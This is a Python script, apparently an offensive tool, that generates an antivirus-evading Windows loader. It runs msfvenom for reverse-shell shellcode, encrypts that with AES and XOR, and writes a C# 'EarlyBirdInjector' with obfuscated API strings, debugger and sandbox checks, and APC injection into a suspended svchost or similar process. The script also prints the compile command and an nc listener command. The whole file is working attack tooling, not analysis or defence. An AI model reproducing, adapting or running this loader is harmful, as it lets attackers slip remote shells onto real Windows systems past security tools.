#!/usr/bin/env python3
import subprocess
import sys
import os
import argparse
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


parser = argparse.ArgumentParser(
    description="Goon Squad."
)
parser.add_argument("--lhost", required=True, help="Listener IP (LHOST)")
parser.add_argument("--lport", required=True, help="Listener port (LPORT)")
parser.add_argument("--payload", default="windows/x64/shell_reverse_tcp",
                    help="msfvenom payload (default: windows/x64/shell_reverse_tcp)")
parser.add_argument("--out", default="eos.cs", help="Output C# file (default: eos.cs)")
parser.add_argument("--targets", nargs="+",
                    default=[
                        r"C:\Windows\System32\RuntimeBroker.exe",
                        r"C:\Windows\System32\svchost.exe",
                        r"C:\Windows\System32\dllhost.exe",
                        r"C:\Windows\System32\msiexec.exe",
                        r"C:\Windows\System32\sihost.exe"
                    ],
                    help="List of target processes to spawn suspended")
args = parser.parse_args()

LHOST = args.lhost
LPORT = args.lport
PAYLOAD = args.payload
OUT_FILE = args.out
TARGET_PROCESSES = args.targets
CHOSEN_TARGET = random.choice(TARGET_PROCESSES)

def generate_raw_shellcode():
    cmd = [
        "msfvenom", "-p", PAYLOAD,
        f"LHOST={LHOST}", f"LPORT={LPORT}",
        "-f", "raw", "-o", "/dev/stdout"
    ]
    try:
        return subprocess.run(cmd, capture_output=True, check=True).stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] msfvenom failed: {e}", file=sys.stderr)
        sys.exit(1)

def aes_encrypt(data):
    key = os.urandom(32)
    iv = os.urandom(16)
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len]) * pad_len
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return key, iv, encryptor.update(data) + encryptor.finalize()

def xor_encrypt(data):
    key = os.urandom(8)
    return key, bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def format_csharp_byte_array(data):
    return "{" + ", ".join(f"0x{b:02x}" for b in data) + "}"

def random_var_name(prefix="var"):
    return prefix + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(random.randint(8,14)))


def xor_string(s, key):
    key_byte = key if isinstance(key, int) else key[0]
    return bytes([b ^ key_byte for b in s.encode()])

STRING_XOR_KEY = random.randint(1, 255)

NT_FUNCTIONS = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtQueueApcThread",
    "NtResumeThread",
]

obfuscated_strings = {}
for func in NT_FUNCTIONS:
    obfuscated_strings[func] = xor_string(func, STRING_XOR_KEY)
obfuscated_strings["ntdll.dll"] = xor_string("ntdll.dll", STRING_XOR_KEY)
obfuscated_strings["target_process"] = xor_string(CHOSEN_TARGET, STRING_XOR_KEY)

def generate_csharp_runner(aes_key, aes_iv, xor_key, encrypted_shellcode):

    enc_cs = format_csharp_byte_array(encrypted_shellcode)
    aes_key_cs = format_csharp_byte_array(aes_key)
    aes_iv_cs = format_csharp_byte_array(aes_iv)
    xor_key_cs = format_csharp_byte_array(xor_key)
    v_enc     = random_var_name("enc")
    v_aesKey  = random_var_name("key")
    v_aesIV   = random_var_name("iv")
    v_xorKey  = random_var_name("xk")
    v_buf     = random_var_name("buf")
    v_si      = random_var_name("si")
    v_pi      = random_var_name("pi")
    v_baseAddr= random_var_name("base")
    v_regSize = random_var_name("regSize")
    v_bw      = random_var_name("bw")
    v_old     = random_var_name("old")
    v_ntdll   = random_var_name("ntdll")
    v_temp    = random_var_name("tmp")

    deobf_func = f"""
        static string X(byte[] d, byte k) {{
            char[] c = new char[d.Length];
            for (int i = 0; i < d.Length; i++) c[i] = (char)(d[i] ^ k);
            return new string(c);
        }}
"""

    string_fields = ""
    str_map = {}
    for func in NT_FUNCTIONS:
        fname = random_var_name("s_")
        str_map[func] = fname
        string_fields += f"        static byte[] {fname} = {format_csharp_byte_array(obfuscated_strings[func])};\n"

    tgt_name = random_var_name("s_tgt")
    string_fields += f"        static byte[] {tgt_name} = {format_csharp_byte_array(obfuscated_strings['target_process'])};\n"
    ntdll_name = random_var_name("s_ntdll")
    string_fields += f"        static byte[] {ntdll_name} = {format_csharp_byte_array(obfuscated_strings['ntdll.dll'])};\n"

    deobf_lines = []
    for func in NT_FUNCTIONS:
        deobf_lines.append(f'            string {func}Name = X({str_map[func]}, {STRING_XOR_KEY});')
    deobf_lines.append(f'            string targetPath = X({tgt_name}, {STRING_XOR_KEY});')
    deobf_lines.append(f'            string ntdllPath = X({ntdll_name}, {STRING_XOR_KEY});')

    delegate_code = """
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int t_NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int t_NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr BufferSize, ref IntPtr NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int t_NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int t_NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int t_NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);
"""

    main_code = f"""
        static void Main()
        {{
            if (System.Diagnostics.Debugger.IsAttached) return;
            System.Threading.Thread.Sleep(5000);
            if (Environment.TickCount < 600000) return;

            byte[] {v_enc} = {enc_cs};
            byte[] {v_aesKey} = {aes_key_cs};
            byte[] {v_aesIV} = {aes_iv_cs};
            byte[] {v_xorKey} = {xor_key_cs};

            // 1) XOR decrypt
            byte[] {v_temp} = new byte[{v_enc}.Length];
            for (int i = 0; i < {v_enc}.Length; i++)
                {v_temp}[i] = (byte)({v_enc}[i] ^ {v_xorKey}[i % {v_xorKey}.Length]);

            // 2) AES decrypt
            byte[] {v_buf} = null;
            using (Aes aes = Aes.Create())
            {{
                aes.Key = {v_aesKey};
                aes.IV = {v_aesIV};
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (MemoryStream msOut = new MemoryStream())
                {{
                    using (MemoryStream msIn = new MemoryStream({v_temp}))
                    using (CryptoStream cs = new CryptoStream(msIn, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {{
                        cs.CopyTo(msOut);
                    }}
                    {v_buf} = msOut.ToArray();
                }}
            }}

{chr(10).join(deobf_lines)}

            IntPtr {v_ntdll} = LoadLibrary(ntdllPath);
            IntPtr pNtAlloc = GetProcAddress({v_ntdll}, NtAllocateVirtualMemoryName);
            IntPtr pNtWrite = GetProcAddress({v_ntdll}, NtWriteVirtualMemoryName);
            IntPtr pNtProtect = GetProcAddress({v_ntdll}, NtProtectVirtualMemoryName);
            IntPtr pNtQueue = GetProcAddress({v_ntdll}, NtQueueApcThreadName);
            IntPtr pNtResume = GetProcAddress({v_ntdll}, NtResumeThreadName);

            var NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<t_NtAllocateVirtualMemory>(pNtAlloc);
            var NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer<t_NtWriteVirtualMemory>(pNtWrite);
            var NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer<t_NtProtectVirtualMemory>(pNtProtect);
            var NtQueueApcThread = Marshal.GetDelegateForFunctionPointer<t_NtQueueApcThread>(pNtQueue);
            var NtResumeThread = Marshal.GetDelegateForFunctionPointer<t_NtResumeThread>(pNtResume);

            STARTUPINFO {v_si} = new STARTUPINFO();
            {v_si}.cb = (uint)Marshal.SizeOf({v_si});
            PROCESS_INFORMATION {v_pi};

            if (!CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref {v_si}, out {v_pi}))
                return;

            IntPtr {v_baseAddr} = IntPtr.Zero;
            IntPtr {v_regSize} = (IntPtr){v_buf}.Length;
            NtAllocateVirtualMemory({v_pi}.hProcess, ref {v_baseAddr}, IntPtr.Zero, ref {v_regSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr {v_bw} = IntPtr.Zero;
            NtWriteVirtualMemory({v_pi}.hProcess, {v_baseAddr}, {v_buf}, (IntPtr){v_buf}.Length, ref {v_bw});

            uint {v_old};
            IntPtr tempAddr = {v_baseAddr};
            IntPtr tempSize = {v_regSize};
            NtProtectVirtualMemory({v_pi}.hProcess, ref tempAddr, ref tempSize, PAGE_EXECUTE_READ, out {v_old});

            NtQueueApcThread({v_pi}.hThread, {v_baseAddr}, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            uint suspendCount;
            NtResumeThread({v_pi}.hThread, out suspendCount);

            CloseHandle({v_pi}.hProcess);
            CloseHandle({v_pi}.hThread);
        }}
"""

    full_code = f'''
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace EarlyBirdInjector
{{
    class Program
    {{
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {{
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        public const uint CREATE_SUSPENDED = 0x00000004;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

{delegate_code}

{deobf_func}

{string_fields}

{main_code}
    }}
}}
'''
    return full_code

if __name__ == "__main__":
    raw = generate_raw_shellcode()
    print(f"[+] Raw shellcode: {len(raw)} bytes")

    aes_key, aes_iv, aes_encrypted = aes_encrypt(raw)
    xor_key, xor_encrypted = xor_encrypt(aes_encrypted)

    code = generate_csharp_runner(aes_key, aes_iv, xor_key, xor_encrypted)

    with open(OUT_FILE, "w") as f:
        f.write(code)

    print(f"[+] C# source written to {OUT_FILE}")
    print(f"[*] Target process: {CHOSEN_TARGET}")
    print("[*] Compile (x64 EXE):")
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe {OUT_FILE}")
    print(f"[*] Start listener: sudo nc -lvnp {LPORT}")
